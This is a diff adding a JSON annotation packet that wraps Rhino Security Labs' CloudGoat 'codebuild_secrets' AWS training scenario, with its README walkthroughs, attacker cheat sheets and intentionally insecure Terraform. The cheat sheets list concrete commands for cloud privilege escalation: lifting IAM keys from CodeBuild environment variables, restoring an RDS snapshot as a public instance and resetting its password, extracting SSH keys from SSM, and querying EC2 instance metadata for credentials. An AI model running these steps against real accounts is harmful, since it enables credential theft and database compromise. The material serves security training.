@@ -1,0 +1,206 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "ec5c0b24b7292522084391ee78937f5f2a7b67412e48866cdb4aa4cba3dd68cf",
+  "case_id": "cloudgoat:aws:codebuild_secrets",
+  "role": "reviewer",
+  "annotator_id": "annotator_02",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:codebuild_secrets",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "codebuild_secrets",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/cheat_sheet_calrissian.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/cheat_sheet_solo.md"
+    ],
+    "terraform_file_count": 11,
+    "has_cheat_sheet": false,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/",
+    "review_score": 108,
+    "independence_group": "cloudgoat-scenario:codebuild_secrets",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/README.md",
+      "member_sha256": "14a35627c8a62f733057c609e3f68b9efe9d69ea4c801b6981428d5eda8f8f87",
+      "bytes": 4098,
+      "content_kind": "md",
+      "text": "# Scenario: codebuild_secrets\n\n**Size:** Large\n\n**Difficulty:** Hard\n\n**Command:** `$ ./cloudgoat.py create codebuild_secrets`\n\n## Scenario Resources\n\n- 1 CodeBuild Project\n- 1 Lambda function\n- 1 VPC with:\n  - RDS x 1\n  - EC2 x 1\n- 2 IAM Users\n- 2 SSM Parameters\n\n## Scenario Start(s)\n\nIAM User \"Solo\".\n\n## Scenario Goal(s)\n\nA pair of secret strings stored in a secure RDS database.\n\n## Summary\n\nStarting as the IAM user Solo, the attacker first enumerates and explores CodeBuild projects, finding unsecured IAM keys for the IAM user Calrissian therein. Then operating as Calrissian, the attacker discovers an RDS database. Unable to access the database's contents directly, the attacker can make clever use of the RDS snapshot functionality to acquire the scenario's goal: a pair of secret strings.\n\nAlternatively, the attacker may explore SSM parameters and find SSH keys to an EC2 instance. Using the metadata service, the attacker can acquire the EC2 instance-profile's keys and push deeper into the target environment, eventually gaining access to the original database and the scenario goal inside (a pair of secret strings) by a more circuitous route.\n\nNote: This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](https://www.lucidchart.com/publicSegments/view/3580abff-ea55-4719-a368-8618f8b61370/image.png)\n\n## Walkthrough - Calrissian via RDS Snapshot\n\n1. As the IAM User Solo, the attacker explores the AWS environment and discovers they are able to list CodeBuild projects.\n2. Within the CodeBuild project, the attacker discovers IAM keys for the user \"Calrissian\" stored in environment variables.\n3. Assuming the identity of the Calrissian user, the attacker is able to list RDS instances and discover the private database which contains the scenario's goal.\n4. While unable to directly access the RDS instance, the attacker is able to create a snapshot from it.\n5. The attacker is then able to create a new RDS instance from the snapshot.\n6. By resetting the admin password of the newly created RDS instance, the attacker is able to grant themselves access to its contents.\n7. After logging into the restored RDS database, the attacker is able to acquire the scenario's goal: the secret strings!\n\nA cheat sheet for this route is available [here](./cheat_sheet_calrissian.md).\n\n## Walkthrough - Solo via EC2 Metadata service\n\n1. As the IAM User Solo, the attacker explores the AWS environment and discovers they are able to list SSM parameters.\n2. Among the account's SSM parameters, the attacker finds a pair of SSH keys stored without any encryption.\n3. The attacker then lists EC2 instances, looking for somewhere to try the SSH keys they found.\n4. After discovering an EC2 instance in the account, the attacker successfully connects to the EC2 instance.\n\n**Branch A**\n\n1. Now working with shell access, the attacker queries the EC2 metadata service and discovers the instance-profile's IAM keys.\n2. Using the EC2 instance's profile, the attacker is able enumerate Lambda functions.\n3. The attacker discovers admin credentials for the RDS database stored insecurely in Lambda environment variables.\n4. Still using the EC2 instance's profile, the attacker lists and accesses the RDS database, and is able to log in using the admin credentials they discovered.\n5. With full access to the RDS database, the attacker is able to recover the scenario's goal: A pair of secret strings!\n\n**Branch B**\n\n1. Now working with shell access, the attacker queries the EC2 metadata service and discovers that the database address is stored there, along with admin credentials.\n2. Using the RDS credentials and address recovered from the EC2 metadata service, the attacker is able to directly log in to the RDS database.\n3. With full access to the RDS database, the attacker is able to recover the scenario's goal: A pair of secret strings!\n\nA cheat sheet for this route is available [here](./cheat_sheet_solo.md).\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/cheat_sheet_calrissian.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/cheat_sheet_calrissian.md",
+      "member_sha256": "b948d1b4944c2a659fa919c77fc69f832106168f43325ce78b94b5f42185dd54",
+      "bytes": 1006,
+      "content_kind": "md",
+      "text": "`aws configure --profile Solo`\n\n`aws codebuild list-projects --profile Solo`\n\n`aws codebuild batch-get-projects --names <project> --profile Solo`\n\n`aws configure --profile Calrissian`\n\n`aws rds describe-db-instances --profile Calrissian`\n\n`aws rds create-db-snapshot --db-instance-identifier <instanceID> --db-snapshot-identifier cloudgoat --profile Calrissian`\n\n`aws rds describe-db-subnet-groups --profile Calrissian`\n\n`aws ec2 describe-security-groups --profile Calrissian`\n\n`aws rds restore-db-instance-from-db-snapshot --db-instance-identifier <DbInstanceID> --db-snapshot-identifier <scapshotId> --db-subnet-group-name <db subnet group> --publicly-accessible --vpc-security-group-ids <ec2-security group> --profile Calrissian`\n\n`aws rds modify-db-instance --db-instance-identifier <DbName> --master-user-password cloudgoat --profile Calrissian`\n\n`psql postgresql://cgadmin@pwnedfinal.crkxmju52zsx.us-east-1.rds.amazonaws.com:5432/postgres`\n\n`\\l`\n\n`\\c securedb`\n\n`select * from sensitive_information`\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/cheat_sheet_solo.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/cheat_sheet_solo.md",
+      "member_sha256": "0ccc3edb0def9df40d429f3c847cb3d26fbdfd4f92ebc1244cc1cf0d154929f2",
+      "bytes": 690,
+      "content_kind": "md",
+      "text": "`aws ssm describe-parameters --profile solo`\n\n`aws ssm get-parameter --name <private key name> --profile solo`\n\n`echo -e \"<private key>\" > ec2_ssh_key`\n\n`chmod 400 ec2_ssh_key`\n\n`aws ssm get-parameter --name <public key name> --profile solo`\n\n`echo -e \"<public key>\" > ec2_ssh_key.pub`\n\n`aws ec2 describe-instances --profile solo`\n\n`ssh -i ec2_ssh_key ubuntu@<instance ip>`\n\n# BRANCH A:\n\n`sudo apt update && sudo apt install awscli -y`\n\n`aws lambda list-functions --region us-east-1`\n\n`aws rds describe-db-instances --profile solo`\n\n# BRANCH B:\n\n`curl http://169.254.169.254/latest/user-data`\n\n`psql -h <rds db host/ip> -U cgadmin -d cloudgoat`\n\n`\\d`\n\n`select * from sensitive_information;`",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/manifest.yml",
+      "member_sha256": "defb0aa060dff437bd8726db48e13ab1e3724504f838a3731608f195bb384b02",
+      "bytes": 1562,
+      "content_kind": "yml",
+      "text": "---\n  # The name of the scenario, alpha-numeric characters only, and underscore-separated\n- name: codebuild_secrets\n  # The name of the author(s), comma separated\n- author: Rhino Security Labs\n  # The version of the scenario, where major versions are breaking changes and minor are small fixes.\n- version: 1.0\n  # Text displayed to the user when they type \"{{ scenario_name }} help\"\n- help: |\n        Starting as the IAM user Solo, the attacker first enumerates and explores CodeBuild\n        projects, finding unsecured IAM keys for the IAM user Calrissian therein. Then operating as\n        Calrissian, the attacker discovers an RDS database. Unable to access the database's\n        contents directly, the attacker can make clever use of the RDS snapshot functionality to\n        acquire the scenario's goal: a pair of secret strings.\n\n        Alternatively, the attacker may explore SSM parameters and find SSH keys to an EC2\n        instance. Using the metadata service, the attacker can acquire the EC2 instance-profile's\n        keys and push deeper into the target environment, eventually gaining access to the original\n        database and the scenario goal inside (a pair of secret strings) by a more circuitous route.\n\n        Note: This scenario may require you to create some AWS resources, and because CloudGoat can \n        only manage resources it creates, you should remove them manually before running `cloudgoat\n        destroy`.\n# Records the date upon which this scenario was last updated, in MM-DD-YYYY format\n- last-updated: 06-24-2019\n...\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/codebuild.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/codebuild.tf",
+      "member_sha256": "b0e0569f95f730089267d11edba906f24b20404cbb95c7c6fc70aff642dfa44a",
+      "bytes": 2278,
+      "content_kind": "tf",
+      "text": "#IAM Role for AWS CodeBuild Project\nresource \"aws_iam_role\" \"cg-codebuild-role\" {\n  name = \"code-build-cg-${var.cgid}-service-role\"\n  assume_role_policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"Service\": \"codebuild.amazonaws.com\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}\nEOF\n  tags = {\n    Name = \"code-build-cg-${var.cgid}-service-role\"\n    Stack = \"${var.stack-name}\"\n    Scenario = \"${var.scenario-name}\"\n  }\n}\n#Inline Policy for AWS CodeBuild Project IAM Role\nresource \"aws_iam_role_policy\" \"cg-codebuild-role-policy\" {\n  name = \"code-build-cg-${var.cgid}-policy\"\n  role = \"${aws_iam_role.cg-codebuild-role.name}\"\n  policy = <<POLICY\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Resource\": [\n        \"*\"\n      ],\n      \"Action\": [\n        \"logs:CreateLogGroup\",\n        \"logs:CreateLogStream\",\n        \"logs:PutLogEvents\"\n      ]\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"ec2:CreateNetworkInterface\",\n        \"ec2:DescribeDhcpOptions\",\n        \"ec2:DescribeNetworkInterfaces\",\n        \"ec2:DeleteNetworkInterface\",\n        \"ec2:DescribeSubnets\",\n        \"ec2:DescribeSecurityGroups\",\n        \"ec2:DescribeVpcs\"\n      ],\n      \"Resource\": \"*\"\n    }\n  ]\n}\nPOLICY\n}\n#AWS CodeBuildProjects\nresource \"aws_codebuild_project\" \"cg-codebuild-project\" {\n  name = \"cg-codebuild-${var.cgid}\"\n  build_timeout = 20\n  service_role = \"${aws_iam_role.cg-codebuild-role.arn}\"\n  environment {\n      compute_type = \"BUILD_GENERAL1_SMALL\"\n      image = \"aws/codebuild/standard:1.0\"\n      type = \"LINUX_CONTAINER\"\n      image_pull_credentials_type = \"CODEBUILD\"\n      privileged_mode = false\n      environment_variable {\n          name = \"calrissian-aws-access-key\"\n          value = \"${aws_iam_access_key.cg-calrissian.id}\"\n      }\n      environment_variable {\n          name = \"calrissian-aws-secret-key\"\n          value = \"${aws_iam_access_key.cg-calrissian.secret}\"\n      }\n  }\n  source {\n      type = \"NO_SOURCE\"\n      buildspec = \"${file(\"../assets/buildspec.yml\")}\"\n  }\n  artifacts {\n      type = \"NO_ARTIFACTS\"\n  }\n  tags = {\n    Name = \"cg-codebuild-${var.cgid}\"\n    Stack = \"${var.stack-name}\"\n    Scenario = \"${var.scenario-name}\"\n  }\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/data_sources.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/data_sources.tf",
+      "member_sha256": "8b81a6d77dcc0dbf5304d17a5ee6b0362cf8cde567bb525b150598180ff8cae3",
+      "bytes": 66,
+      "content_kind": "tf",
+      "text": "#AWS Account Id\ndata \"aws_caller_identity\" \"aws-account-id\" {\n  \n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/ec2.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/ec2.tf",
+      "member_sha256": "9746968628214af467d2b5873a6cba8e8f20539ff53ee94f2ccf97fe7f4b37d6",
+      "bytes": 3927,
+      "content_kind": "tf",
+      "text": "#IAM Role\nresource \"aws_iam_role\" \"cg-ec2-role\" {\n  name = \"cg-ec2-role-${var.cgid}\"\n  assume_role_policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Action\": \"sts:AssumeRole\",\n      \"Principal\": {\n        \"Service\": \"ec2.amazonaws.com\"\n      },\n      \"Effect\": \"Allow\",\n      \"Sid\": \"\"\n    }\n  ]\n}\nEOF\n  tags = {\n      Name = \"cg-ec2-role-${var.cgid}\"\n      Stack = \"${var.stack-name}\"\n      Scenario = \"${var.scenario-name}\"\n  }\n}\n#Iam Role Policy\nresource \"aws_iam_policy\" \"cg-ec2-role-policy\" {\n  name = \"cg-ec2-role-policy-${var.cgid}\"\n  description = \"cg-ec2-role-policy-${var.cgid}\"\n  policy = <<POLICY\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"VisualEditor0\",\n            \"Effect\": \"Allow\",\n            \"Action\": [\n                \"lambda:ListFunctions\",\n                \"lambda:GetFunction\",\n                \"rds:DescribeDBInstances\"\n            ],\n            \"Resource\": \"*\"\n        }\n    ]\n}\nPOLICY\n}\n#IAM Role Policy Attachment\nresource \"aws_iam_policy_attachment\" \"cg-ec2-role-policy-attachment\" {\n  name = \"cg-ec2-role-policy-attachment-${var.cgid}\"\n  roles = [\n      \"${aws_iam_role.cg-ec2-role.name}\"\n  ]\n  policy_arn = \"${aws_iam_policy.cg-ec2-role-policy.arn}\"\n}\n#IAM Instance Profile\nresource \"aws_iam_instance_profile\" \"cg-ec2-instance-profile\" {\n  name = \"cg-ec2-instance-profile-${var.cgid}\"\n  role = \"${aws_iam_role.cg-ec2-role.name}\"\n}\n#Security Groups\nresource \"aws_security_group\" \"cg-ec2-ssh-security-group\" {\n  name = \"cg-ec2-ssh-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for EC2 Instance over SSH\"\n  vpc_id = \"${aws_vpc.cg-vpc.id}\"\n  ingress {\n      from_port = 22\n      to_port = 22\n      protocol = \"tcp\"\n      cidr_blocks = var.cg_whitelist\n  }\n  egress {\n      from_port = 0\n      to_port = 0\n      protocol = \"-1\"\n      cidr_blocks = [\n          \"0.0.0.0/0\"\n      ]\n  }\n  tags = {\n    Name = \"cg-ec2-ssh-${var.cgid}\"\n    Stack = \"${var.stack-name}\"\n    Scenario = \"${var.scenario-name}\"\n  }\n}\n#AWS Key Pair\nresource \"aws_key_pair\" \"cg-ec2-key-pair\" {\n  key_name = \"cg-ec2-key-pair-${var.cgid}\"\n  public_key = \"${file(var.ssh-public-key-for-ec2)}\"\n}\n#EC2 Instance\nresource \"aws_instance\" \"cg-ubuntu-ec2\" {\n    ami = \"ami-0a313d6098716f372\"\n    instance_type = \"t3.micro\"\n    iam_instance_profile = \"${aws_iam_instance_profile.cg-ec2-instance-profile.name}\"\n    subnet_id = \"${aws_subnet.cg-public-subnet-1.id}\"\n    associate_public_ip_address = true\n    vpc_security_group_ids = [\n        \"${aws_security_group.cg-ec2-ssh-security-group.id}\"\n    ]\n    key_name = \"${aws_key_pair.cg-ec2-key-pair.key_name}\"\n    root_block_device {\n        volume_type = \"gp2\"\n        volume_size = 8\n        delete_on_termination = true\n    }\n    user_data = <<-EOF\n        #!/bin/bash\n        apt-get update\n        apt-get install -y postgresql-client\n        psql postgresql://${var.rds-username}:${var.rds-password}@${aws_db_instance.cg-psql-rds.endpoint}/${var.rds-database-name} \\\n        -c \"CREATE TABLE sensitive_information (name VARCHAR(100) NOT NULL, value VARCHAR(100) NOT NULL);\"\n        psql postgresql://${var.rds-username}:${var.rds-password}@${aws_db_instance.cg-psql-rds.endpoint}/${var.rds-database-name} \\\n        -c \"INSERT INTO sensitive_information (name,value) VALUES ('Key1','V\\!C70RY-PvyOSDptpOVNX2JDS9K9jVetC1xI4gMO4');\"\n        psql postgresql://${var.rds-username}:${var.rds-password}@${aws_db_instance.cg-psql-rds.endpoint}/${var.rds-database-name} \\\n        -c \"INSERT INTO sensitive_information (name,value) VALUES ('Key2','V\\!C70RY-JpZFReKtvUiWuhyPGF20m4SDYJtOTxws6');\"\n        EOF\n    volume_tags = {\n        Name = \"CloudGoat ${var.cgid} EC2 Instance Root Device\"\n        Stack = \"${var.stack-name}\"\n        Scenario = \"${var.scenario-name}\"\n    }\n    tags = {\n        Name = \"cg-ubuntu-ec2-${var.cgid}\"\n        Stack = \"${var.stack-name}\"\n        Scenario = \"${var.scenario-name}\"\n    }\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/iam.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/iam.tf",
+      "member_sha256": "14c2b10e12018ee08e64ad0e6549d66e947826ad27f61a50e3b1c6c641945e51",
+      "bytes": 2705,
+      "content_kind": "tf",
+      "text": "resource \"aws_iam_user\" \"cg-calrissian\" {\n  name = \"calrissian\"\n  tags = {\n    Name = \"cg-calrissian-${var.cgid}\"\n    Stack = \"${var.stack-name}\"\n    Scenario = \"${var.scenario-name}\"\n  }\n}\nresource \"aws_iam_access_key\" \"cg-calrissian\" {\n  user = \"${aws_iam_user.cg-calrissian.name}\"\n}\nresource \"aws_iam_user\" \"cg-solo\" {\n  name = \"solo\"\n  tags = {\n    Name = \"cg-solo-${var.cgid}\"\n    Stack = \"${var.stack-name}\"\n    Scenario = \"${var.scenario-name}\"\n  }\n}\nresource \"aws_iam_access_key\" \"cg-solo\" {\n  user = \"${aws_iam_user.cg-solo.name}\"\n}\n#IAM User Policies\nresource \"aws_iam_policy\" \"cg-calrissian-policy\" {\n  name = \"cg-calrissian-policy-${var.cgid}\"\n  description = \"cg-calrissian-policy-${var.cgid}\"\n  policy = <<EOF\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"calrissian\",\n            \"Effect\": \"Allow\",\n            \"Action\": [\n                \"rds:AddTagsToResource\",\n                \"rds:CreateDBSnapshot\",\n                \"rds:DescribeDBInstances\",\n                \"rds:ModifyDBInstance\",\n                \"rds:RestoreDBInstanceFromDBSnapshot\",\n                \"rds:DescribeDBSubnetGroups\",\n                \"rds:CreateDBSecurityGroup\",\n                \"rds:DeleteDBSecurityGroup\",\n                \"rds:DescribeDBSecurityGroups\",\n                \"rds:AuthorizeDBSecurityGroupIngress\",\n                \"ec2:CreateSecurityGroup\",\n                \"ec2:DeleteSecurityGroup\",\n                \"ec2:DescribeSecurityGroups\",\n                \"ec2:AuthorizeSecurityGroupIngress\"\n            ],\n            \"Resource\": \"*\"\n        }\n    ]\n}\nEOF\n}\nresource \"aws_iam_policy\" \"cg-solo-policy\" {\n  name = \"cg-solo-policy-${var.cgid}\"\n  description = \"cg-solo-policy-${var.cgid}\"\n  policy = <<EOF\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"solo\",\n            \"Effect\": \"Allow\",\n            \"Action\": [\n                \"s3:ListAllMyBuckets\",\n                \"ssm:DescribeParameters\",\n                \"ssm:GetParameter\",\n                \"codebuild:ListProjects\",\n                \"codebuild:BatchGetProjects\",\n                \"codebuild:ListBuilds\",\n                \"ec2:DescribeInstances\",\n                \"ec2:DescribeVpcs\",\n                \"ec2:DescribeSubnets\",\n                \"ec2:DescribeSecurityGroups\"\n            ],\n            \"Resource\": \"*\"\n        }\n    ]\n}\nEOF\n}\n#User Policy Attachments\nresource \"aws_iam_user_policy_attachment\" \"cg-calrissian-attachment\" {\n  user = \"${aws_iam_user.cg-calrissian.name}\"\n  policy_arn = \"${aws_iam_policy.cg-calrissian-policy.arn}\"\n}\nresource \"aws_iam_user_policy_attachment\" \"cg-solo-attachment\" {\n  user = \"${aws_iam_user.cg-solo.name}\"\n  policy_arn = \"${aws_iam_policy.cg-solo-policy.arn}\"\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/lambda.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/lambda.tf",
+      "member_sha256": "df9e868f423bd6b591d0cd65eb471d9ecd61a7af4e6ef7a545ededf5f7e50b24",
+      "bytes": 1221,
+      "content_kind": "tf",
+      "text": "data \"archive_file\" \"cg-lambda-function\" {\n  type = \"zip\"\n  source_file = \"../assets/lambda.py\"\n  output_path = \"../assets/lambda.zip\"\n}\nresource \"aws_iam_role\" \"cg-lambda-role\" {\n  name = \"cg-lambda-role-${var.cgid}-service-role\"\n  assume_role_policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Action\": \"sts:AssumeRole\",\n      \"Principal\": {\n        \"Service\": \"lambda.amazonaws.com\"\n      },\n      \"Effect\": \"Allow\",\n      \"Sid\": \"\"\n    }\n  ]\n}\nEOF\n  tags = {\n    Name = \"cg-lambda-role-${var.cgid}\"\n    Stack = \"${var.stack-name}\"\n    Scenario = \"${var.scenario-name}\"\n  }\n}\nresource \"aws_lambda_function\" \"cg-lambda-function\" {\n  filename = \"../assets/lambda.zip\"\n  function_name = \"cg-lambda-${var.cgid}\"\n  role = \"${aws_iam_role.cg-lambda-role.arn}\"\n  handler = \"lambda.handler\"\n  source_code_hash = \"${data.archive_file.cg-lambda-function.output_base64sha256}\"\n  runtime = \"python3.9\"\n  environment {\n      variables = {\n          DB_NAME = \"${var.rds-database-name}\"\n          DB_USER = \"${var.rds-username}\"\n          DB_PASSWORD = \"${var.rds-password}\"\n      }\n  }\n  tags = {\n    Name = \"cg-lambda-${var.cgid}\"\n    Stack = \"${var.stack-name}\"\n    Scenario = \"${var.scenario-name}\"\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/outputs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/outputs.tf",
+      "member_sha256": "bfd959eb4b4093076bd4e0ad4620e4d4473ae93b40b645c2e305bc22b502870e",
+      "bytes": 363,
+      "content_kind": "tf",
+      "text": "\n#Required: Always output the AWS Account ID\noutput \"cloudgoat_output_aws_account_id\" {\n  value = \"${data.aws_caller_identity.aws-account-id.account_id}\"\n}\noutput \"cloudgoat_output_solo_access_key_id\" {\n  value = \"${aws_iam_access_key.cg-solo.id}\"\n}\noutput \"cloudgoat_output_solo_secret_key\" {\n  value = \"${aws_iam_access_key.cg-solo.secret}\"\n  sensitive = true\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/provider.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/provider.tf",
+      "member_sha256": "18db916056912c79fb391099ac9f2b529afdb80e1b45fc168476c1b20ab6a225",
+      "bytes": 490,
+      "content_kind": "tf",
+      "text": "## This configures the minimum required Terraform and provider versions.\n## Configure the AWS profile and region specified in the variables as well as default tags.\n\nterraform {\n  required_version = \">= 1.5\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.0.0\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n\n  default_tags {\n    tags = {\n      Stack    = var.stack-name\n      Scenario = var.scenario-name\n    }\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/rds.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/codebuild_secrets/terraform/rds.tf",
+      "member_sha256": "7de4e35852befd56c372c57baee95671da4e3cf681a84ad0a06d420ba436e603",
+      "bytes": 2083,
+      "content_kind": "tf",
+      "text": "#Security Group\nresource \"aws_security_group\" \"cg-rds-security-group\" {\n  name = \"cg-rds-psql-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for PostgreSQL RDS Instance\"\n  vpc_id = \"${aws_vpc.cg-vpc.id}\"\n  ingress {\n      from_port = 5432\n      to_port = 5432\n      protocol = \"tcp\"\n      cidr_blocks = [\n          \"10.10.10.0/24\",\n          \"10.10.20.0/24\",\n          \"10.10.30.0/24\",\n          \"10.10.40.0/24\"\n      ]\n  }\n  ingress {\n      from_port = 5432\n      to_port = 5432\n      protocol = \"tcp\"\n      cidr_blocks = var.cg_whitelist\n  }\n  egress {\n      from_port = 0\n      to_port = 0\n      protocol = \"-1\"\n      cidr_blocks = [\n          \"0.0.0.0/0\"\n      ]\n  }\n}\n#RDS Subnet Group\nresource \"aws_db_subnet_group\" \"cg-rds-subnet-group\" {\n  name = \"cloud-goat-rds-subnet-group-${var.cgid}\"\n  subnet_ids = [\n      \"${aws_subnet.cg-private-subnet-1.id}\",\n      \"${aws_subnet.cg-private-subnet-2.id}\"\n  ]\n  description = \"CloudGoat ${var.cgid} Subnet Group\"\n}\nresource \"aws_db_subnet_group\" \"cg-rds-testing-subnet-group\" {\n  name = \"cloud-goat-rds-testing-subnet-group-${var.cgid}\"\n  subnet_ids = [\n      \"${aws_subnet.cg-public-subnet-1.id}\",\n      \"${aws_subnet.cg-public-subnet-2.id}\"\n  ]\n  description = \"CloudGoat ${var.cgid} Subnet Group ONLY for Testing with Public Subnets\"\n}\n#RDS PostgreSQL Instance\nresource \"aws_db_instance\" \"cg-psql-rds\" {\n  identifier = \"cg-rds-instance-${local.cgid_suffix}\"\n  engine = \"postgres\"\n  engine_version = \"17.4\"\n  port = \"5432\"\n  instance_class = \"db.m5.large\"\n  db_subnet_group_name = \"${aws_db_subnet_group.cg-rds-subnet-group.id}\"\n  multi_az = false\n  username = \"${var.rds-username}\"\n  password = \"${var.rds-password}\"\n  publicly_accessible = false\n  vpc_security_group_ids = [\n    